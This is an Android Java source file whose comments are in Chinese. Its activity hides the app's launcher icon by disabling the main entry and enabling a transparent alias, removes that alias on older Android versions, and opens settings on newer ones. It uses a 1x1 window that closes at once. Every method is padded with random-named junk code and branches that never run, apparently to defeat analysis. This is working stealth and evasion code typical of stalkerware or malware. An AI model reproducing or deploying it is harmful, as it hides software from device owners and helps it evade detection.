package hayp.rewsp.kayj;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（PGGS），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class YHGY extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_mSCSRdSifP = new java.lang.Object();
        int i_mQHxrjAQEvtZdhzZ = arr_mSCSRdSifP.hashCode();
        int j_ULojoBHVbXipe = new java.util.Random().nextInt(100);
        int tmp_FwhvTtvhEeBStTrVHqN = (i_mQHxrjAQEvtZdhzZ ^ j_ULojoBHVbXipe) & 0x7FFFFFFF;
        if (tmp_FwhvTtvhEeBStTrVHqN == 47 && i_mQHxrjAQEvtZdhzZ < 44) {
            arr_mSCSRdSifP.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(YHGY.this, PGGS.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(YHGY.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        java.lang.Object arr_mSCSRdSifP = new java.lang.Object();
        int i_mQHxrjAQEvtZdhzZ = arr_mSCSRdSifP.hashCode();
        int j_ULojoBHVbXipe = new java.util.Random().nextInt(100);
        int tmp_FwhvTtvhEeBStTrVHqN = (i_mQHxrjAQEvtZdhzZ ^ j_ULojoBHVbXipe) & 0x7FFFFFFF;
        if (tmp_FwhvTtvhEeBStTrVHqN == 47 && i_mQHxrjAQEvtZdhzZ < 44) {
            arr_mSCSRdSifP.toString();
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        String onafUbMExNzqf = java.util.UUID.randomUUID().toString();
        int ckuynpISKy = onafUbMExNzqf.length();
        char pmh_YqEoevU = onafUbMExNzqf.charAt(new java.util.Random().nextInt(ckuynpISKy));
        boolean dimapXfIpOiIKbXlvID = (pmh_YqEoevU == 'z');
        if (dimapXfIpOiIKbXlvID && ckuynpISKy < 9) {
            onafUbMExNzqf.substring(70, 48);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        java.lang.Object arr_mSCSRdSifP = new java.lang.Object();
        int i_mQHxrjAQEvtZdhzZ = arr_mSCSRdSifP.hashCode();
        int j_ULojoBHVbXipe = new java.util.Random().nextInt(100);
        int tmp_FwhvTtvhEeBStTrVHqN = (i_mQHxrjAQEvtZdhzZ ^ j_ULojoBHVbXipe) & 0x7FFFFFFF;
        if (tmp_FwhvTtvhEeBStTrVHqN == 47 && i_mQHxrjAQEvtZdhzZ < 44) {
            arr_mSCSRdSifP.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
